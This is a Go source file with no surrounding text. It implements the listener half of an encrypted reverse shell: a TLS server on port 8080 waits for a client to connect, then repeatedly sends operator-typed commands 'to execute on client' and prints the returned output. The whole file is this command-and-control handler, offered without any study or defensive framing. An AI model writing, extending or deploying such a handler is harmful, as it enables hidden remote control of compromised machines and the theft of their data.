package main

import (
	"bufio"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"os"
)

func main() {
	// Load TLS certificate
	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		fmt.Println("Error loading certificate:", err)
		return
	}

	// Configure TLS server
	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := tls.Listen("tcp", ":8080", config)
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer ln.Close()
	fmt.Println("TLS server listening on port 8080...")

	conn, err := ln.Accept()
	if err != nil {
		fmt.Println("Connection error:", err)
		return
	}
	defer conn.Close()
	fmt.Println("Client connected via secure connection")

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("Enter command to execute on client: ")
		scanner.Scan()
		command := scanner.Text()

		_, err := conn.Write([]byte(command + "\n"))
		if err != nil {
			fmt.Println("Error sending command:", err)
			return
		}

		// Read response length
		var length int32
		err = binary.Read(conn, binary.LittleEndian, &length)
		if err != nil {
			fmt.Println("Error reading response length:", err)
			return
		}

		// Read the response
		response := make([]byte, length)
		_, err = conn.Read(response)
		if err != nil {
			fmt.Println("Error reading response:", err)
			return
		}

		fmt.Println("Client response:\n" + string(response))
	}
}